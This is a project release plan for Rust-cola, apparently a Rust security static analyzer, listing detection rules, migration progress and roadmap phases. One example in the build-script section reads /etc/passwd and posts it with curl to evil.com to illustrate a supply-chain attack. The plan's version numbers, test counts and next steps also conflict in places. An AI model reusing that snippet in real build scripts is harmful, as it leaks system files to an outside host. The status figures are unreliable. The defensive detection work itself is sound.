# Rust-cola Production Release Plan

**Date:** December 14, 2025  
**Current Version:** 0.8.5  
**Target **Progress (v0.7.1):** ✅ **Major milestone achieved**
- ✅ Created `rules/utils.rs` with shared utilities (`strip_string_literals`, `StringLiteralState`)
- ✅ Migrated `UnsafeSendSyncBoundsRule` (RUSTCOLA015) → `concurrency.rs`
- ✅ Migrated `FfiBufferLeakRule` (RUSTCOLA016) → `ffi.rs`
- ✅ Migrated `OverscopedAllowRule` (RUSTCOLA072) → `code_quality.rs`
- ✅ Migrated `CommentedOutCodeRule` (RUSTCOLA092) → `code_quality.rs`
- ✅ Migrated `UnderscoreLockGuardRule`, `BroadcastUnsyncPayloadRule`, `PanicInDropRule`, `UnwrapInPollRule` → `concurrency.rs`
- 📊 **lib.rs reduced:** 22,936 → 21,236 lines (~1,700 lines removed, ~7.4% reduction)
- ✅ **Tests:** 143 passed (up from 138)

**Progress (v0.7.2-v0.7.4):** ✅ **Duplicate rules cleanup complete**
- ✅ Added shared utilities to `utils.rs`: `strip_comments`, `command_rule_should_skip`, `LOG_SINK_PATTERNS`, `INPUT_SOURCE_PATTERNS`
- ✅ Migrated injection rules → `injection.rs` (10 rules)
- ✅ **Major cleanup:** Removed 64 duplicate rules from lib.rs (rules already existed in modules)
- ✅ Added test imports for rules from memory.rs, crypto.rs, resource.rs, input.rs, web.rs
- ✅ Preserved symbol constants (VEC_SET_LEN_SYMBOL, MAYBE_UNINIT_*, MEM_*, DANGER_*) for tests
- 📊 **lib.rs reduced:** 17,360 → 8,253 lines (~9,100 lines removed, **52% reduction**)
- ✅ **Tests:** 146 passed
- ✅ **Rules in lib.rs:** 77 → 13 (only unique advanced dataflow rules remain)

**Progress (v0.7.5):** ✅ **Phase 1.3 - Remaining rules migrated**
- ✅ Migrated 8 memory rules → `memory.rs`: StaticMutGlobalRule (RUSTCOLA025), TransmuteLifetimeChangeRule (RUSTCOLA095), RawPointerEscapeRule (RUSTCOLA096), VecSetLenMisuseRule (RUSTCOLA038), LengthTruncationCastRule (RUSTCOLA022), MaybeUninitAssumeInitDataflowRule (RUSTCOLA078), SliceElementSizeMismatchRule (RUSTCOLA082), SliceFromRawPartsRule (RUSTCOLA083)
- ✅ Migrated `ContentLengthAllocationRule` (RUSTCOLA021) → `web.rs`
- ✅ Migrated `UnboundedAllocationRule` (RUSTCOLA024) → `resource.rs`
- ✅ Migrated `SerdeLengthMismatchRule` (RUSTCOLA081) → `input.rs`
- ✅ Removed duplicate `AllocatorMismatchRule` (already exists as `AllocatorMismatchFfiRule` in ffi.rs)
- ✅ Moved `filter_entry` helper → `utils.rs`
- 📊 **lib.rs reduced:** 8,253 → 5,542 lines (33% reduction; **68% total reduction from 17,360**)
- ✅ **Tests:** 146 passed
- ✅ **Only infrastructure rules remain in lib.rs:** SuppressionRule, DeclarativeRule

**Remaining (~2 infrastructure rules in lib.rs):**
- SuppressionRule (handles #[allow] and suppression comments)
- DeclarativeRule (rule-pack/YAML-based rules).0  
**Status:** Phase 1.3 Complete - All security rules modularized

**Progress (v0.8.0-v0.8.1):** ✅ **Phase 2 - Async/Await & Concurrency rules**
- ✅ RUSTCOLA093 (BlockingOpsInAsyncRule) - already existed
- ✅ RUSTCOLA094 (MutexGuardAcrossAwaitRule) - already existed
- ✅ RUSTCOLA106 (UncheckedTimestampMultiplicationRule) - **NEW** - detects unchecked timestamp overflow
- ✅ RUSTCOLA109 (AsyncSignalUnsafeInHandlerRule) - **NEW** - detects unsafe ops in signal handlers
- ✅ RUSTCOLA111 (MissingSyncBoundOnCloneRule) - **NEW** - detects Clone+Send without Sync in channels
- ✅ RUSTCOLA112 (PinContractViolationRule) - **NEW** - detects Pin contract violations
- ✅ RUSTCOLA113 (OneshotRaceAfterCloseRule) - **NEW** - detects oneshot race after close
- ✅ RUSTCOLA115 (NonCancellationSafeSelectRule) - **NEW** - detects non-cancel-safe futures in select!

**Progress (v0.8.2):** ✅ **Phase 2 - FFI & Supply Chain rules**
- ✅ RUSTCOLA102 (ProcMacroSideEffectsRule) - **NEW** - detects suspicious patterns in proc-macros
- ✅ RUSTCOLA107 (EmbeddedInterpreterUsageRule) - **NEW** - detects embedded interpreters (pyo3, rlua, v8)
- ✅ RUSTCOLA116 (PanicInFfiBoundaryRule) - **NEW** - detects panic-prone code in extern "C" functions

**Progress (v0.8.3):** ✅ **Phase 2 - Interior Mutability & Variance rules**
- ✅ RUSTCOLA100 (OnceCellTocTouRule) - **NEW** - detects TOCTOU race with OnceCell/OnceLock
- ✅ RUSTCOLA101 (VarianceTransmuteUnsoundRule) - **NEW** - detects transmutes violating variance rules
- ✅ RUSTCOLA117 (PanicWhileHoldingLockRule) - **NEW** - detects panic while holding MutexGuard/RwLockGuard

**Progress (v0.8.4):** ✅ **Phase 2 - Lifetime/Borrow & Async Correctness rules**
- ✅ RUSTCOLA103 (WasmLinearMemoryOobRule) - **NEW** - detects unchecked WASM memory operations
- ✅ RUSTCOLA118 (ReturnedRefToLocalRule) - **NEW** - detects returned refs to local variables
- ✅ RUSTCOLA119 (ClosureEscapingRefsRule) - **NEW** - detects escaping refs in spawn closures
- ✅ RUSTCOLA120 (SelfReferentialStructRule) - **NEW** - detects self-referential struct patterns
- ✅ RUSTCOLA121 (ExecutorStarvationRule) - **NEW** - detects CPU-bound work in async context
- 📊 **Tests:** 146 passed
- 📊 **Total Rules:** 116 (107 RUSTCOLA + 9 ADV advanced rules)
- ⚠️ **Superseded by v0.8.6**

**Progress (v0.8.5):** ✅ **Test Coverage for v0.8.4 Rules**
- ✅ Added `mir-extractor/tests/test_new_rules_v084.rs` with 10 unit tests for new rules
- ✅ Created example projects with vulnerable/safe patterns for each new rule:
  - `examples/returned-ref-to-local/` - RUSTCOLA118 test cases
  - `examples/closure-escaping-refs/` - RUSTCOLA119 test cases  
  - `examples/self-referential-struct/` - RUSTCOLA120 test cases
  - `examples/executor-starvation/` - RUSTCOLA121 test cases
  - `examples/wasm-linear-memory-oob/` - RUSTCOLA103 test cases
- 📊 **Tests:** 165 passed (was 146)

**Progress (v0.8.6):** ✅ **Phase 2 High-Priority Rules Complete**
- ✅ RUSTCOLA096 - Enhanced with `unsafe { &*ptr }` outliving pointee detection
- ✅ RUSTCOLA122 (AsyncDropCorrectnessRule) - **NEW** - detects Drop on async types
- ✅ RUSTCOLA123 (UnwrapInHotPathRule) - **NEW** - detects unwrap/expect in loops
- ✅ RUSTCOLA124 (PanicInDropImplRule) - **NEW** - detects panic-prone code in Drop
- ✅ RUSTCOLA125 (SpawnedTaskPanicRule) - **NEW** - detects spawn without panic handling
- 📊 **Tests:** 173 passed (was 165)
- 📊 **Total Rules:** 120 (111 RUSTCOLA + 9 ADV advanced rules)

This document outlines the roadmap to achieve a production-ready release of Rust-cola. Completing these phases will yield a **Release Candidate (RC)** suitable for general availability.

---

## Executive Summary

Rust-cola v0.7.2 has reached significant maturity with 102 security rules and a three-tier analysis architecture. To achieve production readiness, we must:

1. **Stabilize** - Fix failing tests and complete architectural refactoring
2. **Close Gaps** - Implement Rust-specific vulnerability detection (async, lifetimes, panic safety)
3. **Improve Quality** - Enhance precision/recall through field-sensitive analysis
4. **Deliver Value** - Ensure excellent first-run experience with rich outputs

---

## Current State (v0.8.6)

| Metric | Value |
|--------|-------|
| **Total Rules** | 120 (111 RUSTCOLA + 9 ADV) |
| **Test Status** | 173 passed, 0 failed ✅ |
| **Core Codebase** | ~5.5K LOC (mir-extractor/lib.rs) |
| **Rule Modules** | 10 categories + utils |

### Three-Tier Architecture

| Tier | Type | Count | Description |
|------|------|-------|-------------|
| **Tier 1** | MIR Heuristics | 93 | Fast pattern-matching on compiler IR |
| **Tier 2** | Source Analysis | 2 | AST-based checks (commented code, attributes) |
| **Tier 3** | Advanced Dataflow | 7 | Inter-procedural taint tracking, CFG-sensitive |

### Rule Distribution

**Organized Modules (107 RUSTCOLA rules):**

| Module | Rules | Coverage |
|--------|-------|----------|
| `crypto.rs` | 8 | MD5, SHA1, hardcoded keys, timing, weak ciphers, PRNG |
| `memory.rs` | 21 | Transmute, uninit, set_len, raw pointers, self-refs, returned refs to locals |
| `concurrency.rs` | 18 | Mutex guards, async blocking, Send/Sync, executor starvation, closure escapes |
| `ffi.rs` | 9 | Allocator mismatch, CString, packed fields, FFI panic, WASM linear memory |
| `input.rs` | 11 | Env vars, stdin, unicode, deserialization, division, serde, timestamp overflow |
| `resource.rs` | 10 | File permissions, open options, iterators, paths, allocations |
| `code_quality.rs` | 8 | Dead stores, assertions, crate-wide allow, RefCell, commented code |
| `web.rs` | 11 | TLS, CORS, cookies, passwords, logging, AWS S3, content-length |
| `supply_chain.rs` | 4 | RUSTSEC, yanked crates, auditable, proc-macro side effects |
| `injection.rs` | 10 | Command, SQL, path traversal, SSRF, regex, unchecked index, interprocedural |
| `utils.rs` | - | Shared utilities (strip_string_literals, filter_entry) |

**Infrastructure Rules in lib.rs:** 2 rules (SuppressionRule, DeclarativeRule)

**Advanced Rules (mir-advanced-rules):** 9 rules (ADV001-ADV009)

### Output Artifacts

All artifacts generated on every run:

| Artifact | Description |
|----------|-------------|
| `mir.json` | Serialized MIR for all functions |
| `ast.json` | Abstract syntax tree |
| `hir.json` | High-level intermediate representation |
| `findings.json` | Structured vulnerability data |
| `cola.sarif` | SARIF 2.1.0 for IDE/CI integration |
| `llm-prompt.md` | Context-rich prompt for LLM remediation |
| `report.md` | Human-readable summary |

---

## Phase 1: Foundation Hardening

**Duration:** 2-3 weeks  
**Goal:** Stabilize the codebase and eliminate technical debt

### 1.1 Fix Failing Tests (P0) ✅ COMPLETE

**Status:** All tests passing (143/143)

**Fixed in v0.7.0:**
1. `dataflow::path_sensitive::tests::test_field_sensitive_helpers`
2. `dataflow::taint::tests::detects_command_sink`
3. `dataflow::taint::tests::full_taint_analysis`
4. `tests::allocator_mismatch_rule_detects_mixed_allocators`
5. `tests::builtin_security_rules_fire`
6. `tests::untrusted_env_rule_detects_env_call`

**Exit Criteria:** ✅ `cargo test` passes with 0 failures

### 1.2 Complete lib.rs Rule Migration (P0)

**Why Critical:** Large monolithic files impede maintainability and onboarding.

**Scope:** Move remaining dataflow-dependent rules to appropriate modules:
- Injection/dataflow rules → `injection.rs`
- Memory/dataflow rules → `memory.rs`
- Concurrency rules → `concurrency.rs`

**Progress (v0.7.1):** ✅ **Major milestone achieved**
- ✅ Created `rules/utils.rs` with shared utilities (`strip_string_literals`, `StringLiteralState`)
- ✅ Migrated `UnsafeSendSyncBoundsRule` (RUSTCOLA015) → `concurrency.rs`
- ✅ Migrated `FfiBufferLeakRule` (RUSTCOLA016) → `ffi.rs`
- ✅ Migrated `OverscopedAllowRule` (RUSTCOLA072) → `code_quality.rs`
- ✅ Migrated `CommentedOutCodeRule` (RUSTCOLA092) → `code_quality.rs`
- ✅ Migrated `UnderscoreLockGuardRule`, `BroadcastUnsyncPayloadRule`, `PanicInDropRule`, `UnwrapInPollRule` → `concurrency.rs`
- 📊 **lib.rs reduced:** 22,936 → 21,236 lines (~1,700 lines removed, ~7.4% reduction)
- � **Tests:** 143 passed (up from 138)

**Remaining (~20 rules in lib.rs):**
- Injection rules with taint tracking dependencies
- Memory rules with dataflow analysis
- Rules requiring `collect_sanitized_matches` (now available in utils.rs)

**Exit Criteria:** `lib.rs` contains only core infrastructure, all rules in modules

---

## Phase 2: Gap Closure - Rust-Specific Vulnerabilities

**Duration:** 4-6 weeks  
**Goal:** Implement detection for Rust-specific vulnerability classes underrepresented in current tooling

**Research Validation:** 
- InfluxDB v3 codebase analysis confirmed relevance of planned rules. See `docs/real-world-testing-influxdb.md` for details.
- Tokio async runtime analysis identified additional vulnerability patterns. See `docs/real-world-testing-tokio.md` for details.

### 2.1 Async/Await Correctness (High Priority) 🔥

*Validated by InfluxDB: Multiple `#[allow(clippy::await_holding_lock)]` annotations found in test code*
*Validated by Tokio: RUSTSEC-2025-0023 (broadcast channel Sync bound), RUSTSEC-2021-0072 (LocalSet abort)*

| Rule ID | Name | Risk | Status |
|---------|------|------|--------|
| ADV003 | Non-Send types across `.await` | Data races | ✅ Complete |
| RUSTCOLA093 | Blocking in async context | Executor starvation | ✅ Complete |
| RUSTCOLA094 | MutexGuard across `.await` | Deadlock | ✅ Complete |
| RUSTCOLA111 | Missing Sync bound on Clone | Data races | ✅ Complete (v0.8.0) |
| RUSTCOLA115 | Non-cancellation-safe select | Resource leaks | ✅ Complete (v0.8.0) |
| RUSTCOLA121 | Executor starvation detection | DoS | ✅ Complete (v0.8.4) |
| RUSTCOLA122 | Async drop correctness | Resource leaks | ✅ Complete (v0.8.6) |
| RUSTCOLA125 | Spawned task panic propagation | Silent failures | ✅ Complete (v0.8.6) |

**Implementation Notes:**
- Requires async boundary tracking in MIR
- Must understand executor semantics (tokio, async-std, smol)
- InfluxDB pattern: Uses `tokio_util::sync::CancellationToken` for graceful shutdown

### 2.2 Lifetime/Borrow Escape Bugs (Medium Priority)

*Validated by Tokio: RUSTSEC-2023-0005 (ReadHalf::unsplit Pin violation), RUSTSEC-2021-0124 (oneshot race)*

| Rule ID | Name | Risk | Status |
|---------|------|------|--------|
| RUSTCOLA118 | Returned reference to local | UAF | ✅ Complete (v0.8.4) |
| RUSTCOLA119 | Closure capturing escaping refs | UAF | ✅ Complete (v0.8.4) |
| RUSTCOLA096 | `unsafe { &*ptr }` outliving pointee | UAF | ✅ Complete (v0.8.6) |
| RUSTCOLA112 | Pin contract violation (unsplit) | UAF | ✅ Complete (v0.8.0) |
| RUSTCOLA113 | Oneshot race after close | Data race | ✅ Complete (v0.8.0) |
| RUSTCOLA120 | Self-referential struct creation | UAF | ✅ Complete (v0.8.4) |

**Implementation Notes:**
- Leverage rustc's lifetime information where available
- Focus on `unsafe` blocks where borrow checker is bypassed

### 2.3 Panic Safety & Signal Handling (Medium Priority)

*InfluxDB Finding: Custom panic handlers leaked intentionally to prevent panic-during-panic*

| Rule ID | Name | Risk | Status |
|---------|------|------|--------|
| RUSTCOLA109 | Async-signal-unsafe in handler | Deadlock/corruption | ✅ Complete (v0.8.1) |
| RUSTCOLA116 | Panic in FFI boundary | UB | ✅ Complete (v0.8.2) |
| RUSTCOLA117 | Panic while holding lock | Poison/Deadlock | ✅ Complete (v0.8.3) |
| RUSTCOLA123 | `unwrap()`/`expect()` in hot paths | Crash | ✅ Complete (v0.8.6) |
| RUSTCOLA124 | Panic in Drop impl | Double panic | ✅ Complete (v0.8.6) |

**Implementation Notes:**
- Identify FFI boundaries via `extern "C"` functions
- Track lock guard lifetimes and potential panic points
- **RUSTCOLA109:** Detect `eprintln!`, `format!`, heap allocation in `signal_handler` context

### 2.3.1 Timestamp & Integer Safety (New from InfluxDB Research)

*InfluxDB Finding: Proper use of `checked_mul` for nanosecond timestamp conversion*

| Rule ID | Name | Risk | Status |
|---------|------|------|--------|
| RUSTCOLA106 | Unchecked timestamp multiplication | Overflow | ✅ Complete (v0.8.0) |

**Example - Unchecked Overflow:**
```rust
// VULNERABLE: No overflow check
fn to_nanos(seconds: i64) -> i64 {
    seconds * 1_000_000_000  // Can overflow!
}

// CORRECT (InfluxDB pattern):
fn to_nanos(seconds: i64) -> Result<i64, Error> {
    seconds.checked_mul(1_000_000_000)
        .ok_or_else(|| anyhow!("timestamp out of range"))
}
```

### 2.3.2 Embedded Interpreters (New from InfluxDB Research)

*InfluxDB Finding: Python VM embedded via pyo3 for plugins*

| Rule ID | Name | Risk | Status |
|---------|------|------|--------|
| RUSTCOLA107 | Embedded interpreter usage | Code injection | ✅ Complete (v0.8.2) |

**Implementation Notes:**
- Detect usage of `pyo3`, `rlua`, `v8`, `deno_core`
- Flag `Python::attach()`, `Lua::new()` without sandboxing context
- Severity: HIGH (arbitrary code execution surface)

### 2.4 WebAssembly-Specific Vulnerabilities (Medium Priority)

As Rust becomes the primary language for WebAssembly, new vulnerability classes emerge:

| Rule ID | Name | Risk | Status |
|---------|------|------|--------|
| RUSTCOLA103 | Linear memory out-of-bounds | Memory corruption | ✅ Complete (v0.8.4) |
| NEW | Host function trust assumptions | Data injection | ❌ To implement |
| NEW | Component model capability leaks | Privilege escalation | ❌ To implement |

**Example - Linear Memory OOB:**
```rust
// VULNERABLE in WASM: No memory protection
#[no_mangle]
pub extern "C" fn process(ptr: *mut u8, len: usize) {
    unsafe {
        // In WASM, this can access any linear memory!
        std::slice::from_raw_parts_mut(ptr, len);
    }
}
```

**Implementation Notes:**
- Requires WASM-specific analysis mode
- Focus on `#[no_mangle]` exports and `extern "C"` FFI boundaries
- Consider `wasm_bindgen` and WASI patterns

### 2.5 Macro Hygiene & Supply Chain (Low Priority)

Procedural macros execute at compile time, creating supply chain attack vectors:

| Rule ID | Name | Risk | Status |
|---------|------|------|--------|
| RUSTCOLA097 | Build script network access | Supply chain | ✅ Complete |
| RUSTCOLA102 | Proc-macro side effects | Supply chain | ✅ Complete (v0.8.2) |
| NEW | Proc-macro filesystem access | Supply chain | ❌ To implement |

**Example - Build Script Attack:**
```rust
// build.rs - runs at compile time
fn main() {
    std::fs::read_to_string("/etc/passwd");  // Supply chain attack
    std::process::Command::new("curl")
        .args(&["-d", "@/etc/passwd", "http://evil.com"])
        .spawn();
}
```

**Implementation Notes:**
- Source-level scan of `build.rs` for network/filesystem/process APIs
- Audit proc-macro dependencies for suspicious patterns
- Consider integration with cargo-vet/cargo-crev

### 2.6 Interior Mutability & Type Safety (Low Priority)

| Rule ID | Name | Risk | Status |
|---------|------|------|--------|
| RUSTCOLA100 | OnceCell TOCTOU race | Data corruption | ✅ Complete (v0.8.3) |
| NEW | UnsafeCell aliasing violation | UB | ❌ To implement |
| NEW | Lazy initialization panic poison | DoS | ❌ To implement |
| RUSTCOLA101 | Variance transmute unsound | Type confusion | ✅ Complete (v0.8.3) |
| RUSTCOLA117 | Panic while holding lock | Mutex poisoning | ✅ Complete (v0.8.3) |

**Implementation Notes:**
- Requires HIR analysis for type variance
- Focus on `unsafe` blocks with `UnsafeCell`, `OnceCell`, `Lazy`

---

## Phase 3: Precision & Recall Improvements

**Duration:** 3-4 weeks  
**Goal:** Reduce false positives and increase true positive rate

### 3.1 Field-Sensitive Taint Analysis

**Problem:** Currently tainting a struct taints all fields → excessive false positives

**Solution:** Track taint at struct field granularity
- `user.id` (trusted) vs `user.name` (tainted)
- `request.headers` (tainted) vs `request.method` (trusted)

**Status:** Design complete (see `docs/phase3.6-field-sensitive-design.md`)

**Exit Criteria:** Field-level taint tracking operational, measurable FP reduction

### 3.2 Recursion Handling in Call Graph

**Problem:** Recursive functions cause analysis divergence

**Solution:** 
- Detect cycles in call graph
- Implement fixed-point iteration for dataflow convergence
- Set iteration limit with conservative fallback

**Exit Criteria:** Recursive functions analyzed without infinite loops

### 3.3 Sanitization Recognition

**Problem:** Legitimate sanitization not recognized → false positives

**Solution:**
- Expand sanitizer pattern library
- Add framework-specific sanitizers:
  - `actix-web`: `web::Json`, `web::Path` validators
  - `axum`: `extract::Json`, typed extractors
  - `rocket`: `FromForm`, `FromParam` validators
- Recognize common patterns: `html_escape()`, `sql_escape()`, regex validation

**Exit Criteria:** Framework-aware sanitization reduces FP by measurable amount

---

## Phase 4: First-Run Value & UX

**Duration:** 2-3 weeks  
**Goal:** Ensure excellent out-of-box experience

### 4.1 Report Enhancement

**Current State:** Basic findings output

**Improvements:**
- [ ] Add **severity scoring** with CVSS-like metrics
- [ ] Include **code snippets** in SARIF and report.md
- [ ] Generate **fix suggestions** for common patterns
- [ ] Add **confidence levels** (High/Medium/Low)
- [ ] Include **related CWE/CVE** references

### 4.2 Performance & Fast Mode

**Goal:** Results in seconds for quick feedback

**Improvements:**
- [ ] Benchmark against large crates (tokio, serde, hyper, diesel)
- [ ] Add `--fast` flag for Tier 1-only scans (<5s for most crates)
- [ ] Profile and optimize hot paths
- [ ] Add progress indicators for long scans

### 4.3 Configuration Experience

**Goal:** Easy onboarding and customization

**Improvements:**
- [ ] `cola init` command to generate `.cola.yml`
- [ ] Pre-built rule profiles: `strict`, `balanced`, `permissive`
- [ ] Per-directory rule overrides
- [ ] Baseline support for incremental adoption

---

## Priority Matrix

| Priority | Task | Impact | Effort | Phase |
|----------|------|--------|--------|-------|
| 🔴 P0 | Fix 6 failing tests | CI reliability | 1 week | 1 |
| 🔴 P0 | Complete lib.rs migration | Maintainability | 1 week | 1 |
| 🟠 P1 | Async correctness rules | Rust-specific gaps | 2 weeks | 2 |
| 🟠 P1 | Field-sensitive taint | Precision | 2 weeks | 3 |
| 🟡 P2 | Panic safety rules | Comprehensiveness | 1 week | 2 |
| 🟡 P2 | Lifetime escape detection | Memory safety | 2 weeks | 2 |
| 🟡 P2 | Recursion handling | Analysis robustness | 1 week | 3 |
| 🟢 P3 | Report enhancements | UX/Value | 1 week | 4 |
| 🟢 P3 | Framework sanitizers | Recall | 1 week | 3 |
| 🟢 P3 | Fast mode & profiling | Performance | 1 week | 4 |
| 🟢 P3 | Configuration UX | Onboarding | 1 week | 4 |

---

## Release Criteria for v1.0.0 RC

### Must Have (Blocking)
- [x] All tests passing (0 failures) ✅ 146/146
- [x] All rules migrated to modules (lib.rs < 5K LOC infrastructure only) ✅ 5,542 LOC
- [ ] Async correctness rules implemented (4+ new rules)
- [ ] Field-sensitive taint analysis operational
- [ ] SARIF output includes code snippets and severity

### Should Have (Expected)
- [ ] Panic safety rules (3+ new rules)
- [ ] Lifetime escape detection (2+ new rules)
- [ ] Framework-aware sanitizers (actix, axum, rocket)
- [ ] `--fast` mode available
- [ ] Documentation updated for all new rules

### Nice to Have (Stretch)
- [ ] `cola init` configuration wizard
- [ ] Rule profiles (strict/balanced/permissive)
- [ ] Benchmark suite with precision/recall metrics
- [ ] VS Code extension preview

---

## Success Metrics

| Metric | Current | Target (v1.0) |
|--------|---------|---------------|
| Total Rules | 120 | 125+ |
| Test Pass Rate | 100% (173/173) | 100% |
| Rust-Specific Rules | ~35 | 40+ |
| Average Scan Time (medium crate) | TBD | <30s |
| Fast Mode Scan Time | N/A | <5s |
| False Positive Rate | TBD | <15% |

---

## Future Rule ID Assignments

Reserved rule IDs for planned rules (from GAP-ANALYSIS-RUST-SPECIFIC.md + InfluxDB research):

### Phase 2.1 - Async Correctness (High Priority)

| Rule ID | Name | Category | Priority | Source |
|---------|------|----------|----------|--------|
| RUSTCOLA093 | `blocking-in-async-context` | Async | High | Planned |
| RUSTCOLA094 | `mutex-guard-across-await` | Async | High | **InfluxDB validated** |
| RUSTCOLA115 | `non-cancellation-safe-select` | Async | Medium | **Tokio research** |

### Phase 2.2 - Memory & Type Safety

| Rule ID | Name | Category | Priority | Source |
|---------|------|----------|----------|--------|
| RUSTCOLA095 | `transmute-lifetime-change` | Memory | High | ✅ Complete |
| RUSTCOLA096 | `raw-pointer-from-reference-escape` | Memory | High | ✅ Complete |
| RUSTCOLA106 | `unchecked-timestamp-multiplication` | Memory | Medium | **InfluxDB** |
| RUSTCOLA111 | `missing-sync-bound-on-clone` | Concurrency | High | **Tokio (RUSTSEC-2025-0023)** |
| RUSTCOLA112 | `pin-contract-violation` | Memory | High | **Tokio (RUSTSEC-2023-0005)** |
| RUSTCOLA113 | `oneshot-race-after-close` | Concurrency | High | **Tokio (RUSTSEC-2021-0124)** |

### Phase 2.3 - Panic & Signal Safety

| Rule ID | Name | Category | Priority | Source |
|---------|------|----------|----------|--------|
| RUSTCOLA098 | `panic-unsafe-invariant` | Panic Safety | Medium | Planned |
| RUSTCOLA099 | `catch-unwind-mutable-reference` | Panic Safety | Medium | Planned |
| RUSTCOLA109 | `async-signal-unsafe-in-handler` | Signal Safety | High | **InfluxDB** |

### Phase 2.4 - Supply Chain & Code Execution

| Rule ID | Name | Category | Priority | Source |
|---------|------|----------|----------|--------|
| RUSTCOLA097 | `build-script-network-access` | Supply Chain | High | ✅ Complete |
| RUSTCOLA102 | `proc-macro-side-effects` | Supply Chain | Low | Planned |
| RUSTCOLA107 | `embedded-interpreter-usage` | Code Injection | Medium | **InfluxDB** |

### Phase 2.5 - Interior Mutability & Type Safety

| Rule ID | Name | Category | Priority | Source |
|---------|------|----------|----------|--------|
| RUSTCOLA100 | `oncecell-toctou` | Interior Mutability | Medium | Planned |
| RUSTCOLA101 | `variance-transmute-unsound` | Type Safety | Low | Planned |

### Phase 2.6 - WebAssembly (Future)

| Rule ID | Name | Category | Priority | Source |
|---------|------|----------|----------|--------|
| RUSTCOLA103 | `wasm-linear-memory-oob` | WebAssembly | Medium | Planned |

### Lower Priority (Backlog from InfluxDB)

| Rule ID | Name | Category | Priority | Source |
|---------|------|----------|----------|--------|
| RUSTCOLA104 | `incomplete-sensitive-pattern-list` | Security | INFO | **InfluxDB** |
| RUSTCOLA105 | `insecure-token-file-permissions` | Security | Low | **InfluxDB** |
| RUSTCOLA108 | `missing-graceful-shutdown` | Operational | Low | **InfluxDB** |
| RUSTCOLA110 | `incomplete-string-escaping` | Input | Low | **InfluxDB** |

### Supply Chain & Ecosystem (From Tokio Research)

| Rule ID | Name | Category | Priority | Source |
|---------|------|----------|----------|--------|
| RUSTCOLA114 | `unmaintained-archive-crate` | Supply Chain | High | **Tokio (TARmageddon)** |

---

## Research Summary

### InfluxDB v3 Analysis (Complete)
- Validated RUSTCOLA094 (mutex-guard-across-await)
- Identified 7 new rules (RUSTCOLA104-110)
- Key patterns: CancellationToken, checked timestamp arithmetic, embedded interpreters

### Tokio Async Runtime Analysis (Complete)
- Validated RUSTCOLA015 (blocking-in-async)
- Identified 5 new rules (RUSTCOLA111-115)
- Key findings:
  - RUSTSEC-2025-0023: Broadcast channel missing Sync bound on clone
  - RUSTSEC-2023-0005: Pin contract violation in ReadHalf::unsplit
  - RUSTSEC-2021-0124: Data race in oneshot channel after close
  - RUSTSEC-2021-0072: LocalSet task dropped on wrong thread
  - CVE-2025-62518 (TARmageddon): tokio-tar parser desynchronization

---

## Timeline Estimate

| Phase | Duration | Cumulative |
|-------|----------|------------|
| Phase 1: Foundation | 2-3 weeks | 3 weeks |
| Phase 2: Gap Closure | 4-6 weeks | 9 weeks |
| Phase 3: Precision | 3-4 weeks | 13 weeks |
| Phase 4: UX | 2-3 weeks | 16 weeks |
| **Total to RC** | **~16 weeks** | **~4 months** |

---

## Progress Log

### v0.7.5 + Research (Current)
- ✅ **Phase 1.3 COMPLETE:** All security rules modularized
  - Migrated 8 memory rules → `memory.rs`: StaticMutGlobalRule, TransmuteLifetimeChangeRule, RawPointerEscapeRule, VecSetLenMisuseRule, LengthTruncationCastRule, MaybeUninitAssumeInitDataflowRule, SliceElementSizeMismatchRule, SliceFromRawPartsRule
  - Migrated `ContentLengthAllocationRule` → `web.rs`
  - Migrated `UnboundedAllocationRule` → `resource.rs`
  - Migrated `SerdeLengthMismatchRule` → `input.rs`
  - Removed duplicate `AllocatorMismatchRule`
  - Moved `filter_entry` helper → `utils.rs`
  - **lib.rs reduced:** 8,253 → 5,542 lines (68% total reduction from 17,360)
  - **Only infrastructure rules remain:** SuppressionRule, DeclarativeRule
  - **Tests:** 146 passed
- ✅ **Pre-Phase 2 Research:** InfluxDB v3 codebase analysis
  - Analyzed `influxdata/influxdb` GitHub repository for real-world patterns
  - **Validated:** RUSTCOLA094 (mutex-guard-across-await) - found `#[allow(clippy::await_holding_lock)]`
  - **New rules identified:** RUSTCOLA106-110 from production patterns
  - **Key insight:** Production databases use `CancellationToken` for graceful shutdown
  - Created `docs/real-world-testing-influxdb.md` with detailed findings
- ✅ **Pre-Phase 2 Research:** Tokio async runtime analysis
  - Analyzed `tokio-rs/tokio` GitHub repository and RUSTSEC advisories
  - **Validated:** RUSTCOLA015 (blocking-in-async) - Tokio wraps std::fs in spawn_blocking
  - **5 RUSTSEC advisories analyzed:** Data races, Pin violations, LocalSet thread safety
  - **TARmageddon (CVE-2025-62518):** Archive parser desync affecting tokio-tar ecosystem
  - **New rules identified:** RUSTCOLA111-115 from vulnerability patterns
  - Created `docs/real-world-testing-tokio.md` with detailed findings

### v0.7.2-v0.7.4
- ✅ **Phase 1.2 COMPLETE:** Duplicate rules cleanup
  - Removed 64 duplicate rules from lib.rs
  - Migrated injection rules → `injection.rs` (10 rules)
  - **lib.rs reduced:** 17,360 → 8,253 lines (52% reduction)

### v0.7.1
- ✅ Created `rules/utils.rs` with shared utilities
- ✅ Migrated 8 rules to modules (concurrency.rs, ffi.rs, code_quality.rs)
- **lib.rs reduced:** 22,936 → 21,236 lines

### Next Steps
1. ✅ **COMPLETE:** Phase 1 - lib.rs at 5,542 lines (infrastructure only)
2. ✅ **COMPLETE:** Real-world research - InfluxDB + Tokio analysis validates planned rules
3. **NEXT:** Phase 2.1 - Implement RUSTCOLA093 (blocking-in-async-context)
4. **THEN:** Phase 2.1 - Implement RUSTCOLA094 (mutex-guard-across-await)
5. **Upcoming:** Phase 3.1 - Field-sensitive taint analysis

---

## Document History

| Date | Version | Author | Changes |
|------|---------|--------|---------|
| 2025-12-14 | 1.0 | GitHub Copilot | Initial production release plan |
| 2025-12-14 | 1.1 | GitHub Copilot | Updated for v0.7.2, Phase 1.1 complete |
| 2025-12-14 | 1.2 | GitHub Copilot | v0.7.5: Phase 1.3 complete, added WebAssembly/Macro sections |
| 2025-01-XX | 1.3 | GitHub Copilot | InfluxDB research: validated async rules, added 5 new rule IDs |
| 2025-01-XX | 1.4 | GitHub Copilot | Tokio research: added 5 new rule IDs (RUSTCOLA111-115), TARmageddon analysis |
